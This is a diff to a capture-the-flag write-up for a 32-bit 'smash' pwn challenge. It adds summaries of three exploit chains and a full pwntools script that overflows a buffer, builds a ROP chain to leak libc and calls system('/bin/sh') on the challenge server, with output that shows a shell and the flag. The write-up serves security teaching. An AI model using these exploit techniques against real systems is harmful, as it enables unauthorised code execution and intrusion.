@@ -8,12 +8,17 @@
 >
 > [`hello`](hello)
 
-Tags: _pwn_ _x86_ _remote-shell_ _format-string_ _got-overwrite_
+Tags: _pwn_ _x86_ _remote-shell_ _format-string_ _got-overwrite_ _bof_ _rop_
 
 
 ## Summary
 
-leak libc -> ret2main -> (printf -> system) -> shell
+Exploit 1: leak libc (stack) -> GOT(`free` -> `main`) -> GOT(`printf` -> `system`) -> shell
+
+Exploit 2: GOT(`free` -> `main`) -> leak libc (GOT) -> GOT(`printf` -> `system`) -> shell
+
+Exploit 3: BOF -> ROP -> leak libc (GOT) -> `main` -> BOF -> ROP -> `system` -> shell
+
 
 ## Analysis
 
@@ -304,6 +309,82 @@ Output:
     PIE:      PIE enabled
 [*] printf 0xf7de3030
 [*] baselibc 0xf7d9a000
+[*] Switching to interactive mode
+
+$ cat flag.txt
+csictf{5up32_m4210_5m45h_8202}
+```
+
+
+### Exploit 3: All Smash
+
+_What if there were no format-string exploit?_
+
+```
+#!/usr/bin/python3
+
+from pwn import *
+
+binary = ELF('./hello')
+context.update(arch='i386',os='linux')
+
+p = remote('chall.csivit.com', 30046)
+libc = ELF('libc-database/db/libc6-i386_2.23-0ubuntu11.2_amd64.so')
+
+payload  = 0x88 * b'A'
+payload += p32(binary.plt.puts)
+payload += p32(binary.sym.main)
+payload += p32(binary.got.puts)
+
+p.sendlineafter('name?\n', payload)
+p.recvuntil('!\n')
+_ = p.recv(4)
+puts = u32(_ + (4-len(_))*b'\x00')
+log.info('puts: ' + hex(puts))
+baselibc = puts - libc.sym.puts
+log.info('baselibc: ' + hex(baselibc))
+libc.address = baselibc
+
+payload  = 0x88 * b'A'
+payload += p32(libc.sym.system)
+payload += 4 * b'B'
+payload += p32(libc.search(b'/bin/sh').__next__())
+
+p.sendlineafter('name?\n', payload)
+p.recvuntil('!')
+p.interactive()
+```
+
+This is not unlike [pwn intended 0x3 remote shell](https://github.com/datajerk/ctf-write-ups/tree/master/csictf2020/small_pwns#exploit-remote-shell), however, this is for 32-bits, and can be brittle (see below).
+
+From the source (above) `local_88` is `0x88` bytes from the return address on the stack (just how Ghidra names locals, quite handy).  So, just send 0x88 _non-null_ bytes, followed by a call to `puts`, then the return to `main` (from `puts`) and the argument to `puts`--the address of, well, `puts`.
+
+This will leak the address of `puts` to then compute the base of libc.
+
+Next, do the same, but this time return to `system` and get a shell.
+
+> This did not work on my Ubuntu 18 dev container because `system` ends in `\x00` and `strcpy` stops and the first null, fortuneatly the challenge server does not have this version of libc.
+
+Output:
+
+```
+# ./exploit3.py
+[*] '/pwd/datajerk/csictf2020/smash/hello'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+[*] Loaded 10 cached gadgets for './hello'
+[+] Opening connection to chall.csivit.com on port 30046: Done
+[*] '/pwd/datajerk/csictf2020/smash/libc-database/db/libc6-i386_2.23-0ubuntu11.2_amd64.so'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[*] puts: 0xf7dd1150
+[*] baselibc: 0xf7d72000
 [*] Switching to interactive mode
 
 $ cat flag.txt
